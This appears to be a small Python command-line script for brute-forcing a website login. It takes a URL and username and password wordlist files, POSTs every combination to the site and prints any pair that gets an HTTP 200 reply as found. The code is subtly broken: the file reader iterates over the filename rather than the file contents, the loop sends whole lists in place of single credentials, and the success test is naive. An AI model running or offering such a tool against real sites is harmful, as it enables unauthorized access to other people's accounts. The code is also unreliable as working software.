import requests
import sys


def checking_command():
    command = sys.argv[1::]
    url = sys.argv[1]
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    print(url)
    if '-u' in command:
        index = command.index('-u')
        uname_file = command[index + 1]
    if '-p' in command:
        index = command.index('-p')
        passwd_file = command[index + 1]
    print(uname_file)
    print(passwd_file)
    uname = reading_files(uname_file)
    passwd = reading_files(passwd_file)
    for names in uname:
        for passwords in passwd:
            connecting_to_site(url, uname, passwd)

def reading_files(file):
    texts = []
    with open(file, 'r'):
        for line in file:
            line = line.strip()
            texts.append(line)
        return texts

def connecting_to_site(url, username, passwd):
    login_data = {
        'username': username,
        'password': passwd
    }
    response = requests.post(url, data=login_data)

    if response.status_code == 200:
        print(f'{username} and {passwd} found')


checking_command()